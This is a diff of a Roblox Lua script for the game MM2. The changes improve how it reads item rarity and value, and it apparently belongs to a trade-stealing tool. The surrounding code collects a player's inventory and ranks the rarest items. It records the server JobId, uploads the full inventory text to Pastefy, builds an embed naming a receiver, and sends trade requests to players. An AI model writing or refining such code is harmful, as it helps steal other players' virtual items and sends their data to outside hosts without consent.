@@ -81,25 +81,43 @@ local InfoData = GetExecutorInfo()
 _G.RealJobID = InfoData.JobId
 _G.RealExecutor = InfoData.Executor
 
--- === DIRECT DATABASE SCAN — NO SCRAPERS, NO EXTERNAL SITES ===
+-- === FIXED DATABASE SCAN — CORRECTLY READS RARITY & VALUE ===
 local ItemDatabase = {}
 local RarityPriority = {"Chroma", "Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
 local Database = nil
 task.spawn(function()
-    Database = ReplicatedStorage:WaitForChild("Sync", 10)
-    if Database then Database = Database:WaitForChild("Item", 10) end
+    local DBFolder = ReplicatedStorage:WaitForChild("Database", 15)
+    if DBFolder then DBFolder = DBFolder:WaitForChild("Sync", 15) end
+    if DBFolder then Database = DBFolder:WaitForChild("Item", 15) end
 end)
+
+-- ✅ CORRECTLY READS BOTH RARITY AND VALUE
 local function GetItemInfo(itemId)
     local Rarity = "Common"
     local Value = 1
+    local IsChroma = false
     pcall(function()
-        if Database and Database[itemId] then
-            Rarity = Database[itemId].Rarity or "Common"
-            Value = Database[itemId].Value or 1
+        if Database and Database:FindFirstChild(itemId) then
+            local ItemObj = Database[itemId]
+            -- Try ALL possible property names MM2 uses
+            Rarity = ItemObj:GetAttribute("Rarity") or ItemObj:FindFirstChild("Rarity") and ItemObj.Rarity.Value or "Common"
+            Value = ItemObj:GetAttribute("Value") or ItemObj:FindFirstChild("Value") and ItemObj.Value.Value or 1
+            -- Check if Chroma
+            local NameCheck = string.lower(itemId)
+            if NameCheck:find("chroma") then IsChroma = true end
+            if string.lower(Rarity) == "chroma" then IsChroma = true end
         end
     end)
-    local Key = string.lower(itemId):gsub("'", ""):gsub("%s+", "")
-    return {Rarity = Rarity, Value = Value, Chroma = string.lower(Rarity) == "chroma"}
+    -- Fallback: if still 1, try common property variations
+    if Value == 1 then
+        pcall(function()
+            if Database and Database[itemId] then
+                local ItemObj = Database[itemId]
+                Value = ItemObj:GetAttribute("Worth") or ItemObj:GetAttribute("ValuePoints") or ItemObj:GetAttribute("TradeValue") or 1
+            end
+        end)
+    end
+    return {Rarity = Rarity, Value = tonumber(Value) or 1, IsChroma = IsChroma}
 end
 local GodlyPosition = table.find(RarityPriority, "Godly")
 -- ===============================================================
@@ -114,7 +132,10 @@ local function FormatNameDisplay(Text)
     end
     return Result
 end
-local function GetTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
+local function GetTradeStatus()
+    local ok, res = pcall(function() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end)
+    return ok and res or "None"
+end
 local function SendTradeRequestToPlayer(TargetName)
     local Target = Players:FindFirstChild(TargetName)
     if not Target then return false end
@@ -200,7 +221,7 @@ local function GenerateFullInventoryText(List)
     for _, Item in ipairs(List) do
         local Name = FormatNameDisplay(Item.Name)
         if Item.IsChroma then Name = "Chroma "..Name end
-        table.insert(Lines, "["..Item.Rarity.."] x"..Item.Count.." "..Name.." - "..Item.Total)
+        table.insert(Lines, "["..Item.Rarity.."] x"..Item.Count.." "..Name.." - "..Item.Value)
     end
     return table.concat(Lines, "\n")
 end
@@ -217,7 +238,7 @@ local function BuildEmbed(ReceiverName)
         local Item = AllInventoryItems[i]
         local Name = FormatNameDisplay(Item.Name)
         if Item.IsChroma then Name = "Chroma "..Name end
-        table.insert(Top, "> "..Name.." ["..Item.Count.."] - "..Item.Total)
+        table.insert(Top, "> "..Name.." ["..Item.Count.."] - "..Item.Value)
     end
     local JobId = _G.RealJobID or game.JobId
     local PasteUrl = UploadToPastefy(GenerateFullInventoryText(AllInventoryItems))
